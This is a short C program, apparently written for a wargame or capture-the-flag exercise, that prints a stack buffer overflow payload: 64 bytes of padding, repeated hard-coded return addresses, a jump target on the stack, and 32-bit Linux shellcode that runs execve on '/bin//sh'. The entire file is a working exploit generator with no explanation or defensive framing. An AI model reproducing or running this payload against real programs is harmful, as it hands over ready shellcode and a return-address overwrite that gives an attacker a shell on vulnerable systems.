#include <stdio.h>

int main(void){
    //buffer
    for(int i = 0; i < 64 ; i++){
        printf("A");
    }

    // return to the return of main
    int payload = 0x08048553;
    // 4 addresses padding before the return pointer
    for(int bruteforce = 0; bruteforce < 5; bruteforce++){
      for(int i = 0; i < 4 ; i++){
          printf("%c", ((char*)&payload)[i]);
      }
    }
    int finalreturn = 0xbffff7c4;
    for(int i = 0; i < 4 ; i++){
        printf("%c", ((char*)&finalreturn)[i]);
    }

    char *shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
                      "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
    for(int i = 0; i < strlen(shellcode); i++){
      printf("%c", (shellcode)[i]);
    }

    return 0;
}
